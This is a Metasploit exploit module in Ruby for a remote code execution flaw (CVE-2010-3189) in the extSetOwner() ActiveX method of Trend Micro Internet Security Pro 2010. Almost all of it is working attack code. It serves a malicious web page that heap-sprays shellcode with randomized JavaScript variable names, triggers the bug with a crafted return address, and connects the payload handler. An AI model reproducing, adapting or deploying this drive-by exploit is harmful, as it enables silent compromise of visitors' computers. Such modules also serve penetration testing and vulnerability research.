##
# trendmicro_extsetowner.rb
#
# Trend Micro Internet Security Pro 2010 ActiveX extSetOwner() Remote Code Execution exploit for the Metasploit Framework
#
# Exploit successfully tested on the following platforms:
#  - Trend Micro Internet Security Pro 2010 on Internet Explorer 7, Windows XP SP3
#  - Trend Micro Internet Security Pro 2010 on Internet Explorer 7, Windows Vista SP2
#
# UfPBCtrl.dll version tested:
# File Version: 17.50.0.1366
# ClassID: 15DBC3F9-9F0A-472E-8061-043D9CEC52F0
# RegKey Safe for Script: True
# RegKey Safe for Init: True
# KillBitSet: False
#
# References:
#  - CVE-2010-3189
#  - OSVDB 67561
#  - http://www.zerodayinitiative.com/advisories/ZDI-10-165/ - Original advisory by Andrea Micalizzi aka rgod via Zero Day Initiative
#  - http://www.exploit-db.com/exploits/14878/ - MOAUB #03 exploit
#  - http://www.exploit-db.com/trend-micro-internet-security-pro-2010-activex-extsetowner-remote-code-execution/ - MOAUB #03 binary analysis
#  - http://www.rec-sec.com/2010/09/28/trend-micro-internet-security-2010-rce-exploit/ - Metasploit exploit by Trancer, Recognize-Security
#
# Trancer
# http://www.rec-sec.com
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Trend Micro Internet Security Pro 2010 ActiveX extSetOwner() Remote Code Execution',
			'Description'    => %q{
					This module exploits a remote code execution vulnerability in Trend Micro 
					Internet Security Pro 2010 ActiveX.
					When sending an invalid pointer to the extSetOwner() function of UfPBCtrl.dll 
					an attacker may be able to execute arbitrary code.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'Trancer <mtrancer[at]gmail.com' ],
			'Version'        => '$Revision:$',
			'References'     =>
				[
					[ 'CVE', '2010-3189' ],
					[ 'OSVDB', '67561'],
					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-10-165/' ],	# Andrea Micalizzi aka rgod via Zero Day Initiative
					[ 'URL', 'http://www.exploit-db.com/exploits/14878/' ],		# MOAUB #03
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'         => 1024,
					'BadChars'      => "\x00",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows XP SP0-SP2 / Windows Vista / IE 6.0 SP0-SP2 / IE 7', { 'Ret' => 0x00C750A1 } ] 
				],
			'DisclosureDate' => 'Aug 25 2010',
			'DefaultTarget'  => 0))
	end

	def autofilter
		false
	end

	def check_dependencies
		use_zlib
	end

	def on_request_uri(cli, request)
		# Re-generate the payload.
		return if ((p = regenerate_payload(cli)) == nil)

		# Encode the shellcode.
		shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))
		
		# Setup exploit buffers
		nops      = Rex::Text.to_unescape(make_nops(4))
		ret  	  = Rex::Text.to_unescape([target.ret].pack('V'))
		blocksize = 0x40000
		fillto    = 500 
		
		# ActiveX parameters
		clsid 	= "15DBC3F9-9F0A-472E-8061-043D9CEC52F0"

		# Randomize the javascript variable names
		ufpbctrl     = rand_text_alpha(rand(100) + 1)
		j_shellcode  = rand_text_alpha(rand(100) + 1)
		j_nops       = rand_text_alpha(rand(100) + 1)
		j_ret        = rand_text_alpha(rand(100) + 1)
		j_headersize = rand_text_alpha(rand(100) + 1)
		j_slackspace = rand_text_alpha(rand(100) + 1)
		j_fillblock  = rand_text_alpha(rand(100) + 1)
		j_block      = rand_text_alpha(rand(100) + 1)
		j_memory     = rand_text_alpha(rand(100) + 1)
		j_counter    = rand_text_alpha(rand(30) + 2)

		html = %Q|<html>
<object classid='clsid:#{clsid}' id='#{ufpbctrl}'></object>
<script>
var #{j_shellcode} = unescape('#{shellcode}');
var #{j_nops} = unescape('#{nops}');
var #{j_headersize} = 20;
var #{j_slackspace} = #{j_headersize} + #{j_shellcode}.length;
while (#{j_nops}.length < #{j_slackspace}) #{j_nops} += #{j_nops};
var #{j_fillblock} = #{j_nops}.substring(0,#{j_slackspace});
var #{j_block} = #{j_nops}.substring(0,#{j_nops}.length - #{j_slackspace});
while (#{j_block}.length + #{j_slackspace} < #{blocksize}) #{j_block} = #{j_block} + #{j_block} + #{j_fillblock};
var #{j_memory} = new Array();
for (#{j_counter} = 0; #{j_counter} < #{fillto}; #{j_counter}++) { 
	#{j_memory}[#{j_counter}] = #{j_block} + #{j_shellcode};
} 
#{ufpbctrl}.extSetOwner(unescape('#{ret}'));
</script>
</html>|

		print_status("Sending exploit to #{cli.peerhost}:#{cli.peerport}...")

		# Transmit the response to the client
		send_response(cli, html, { 'Content-Type' => 'text/html' })

		# Handle the payload
		handler(cli)
	end
end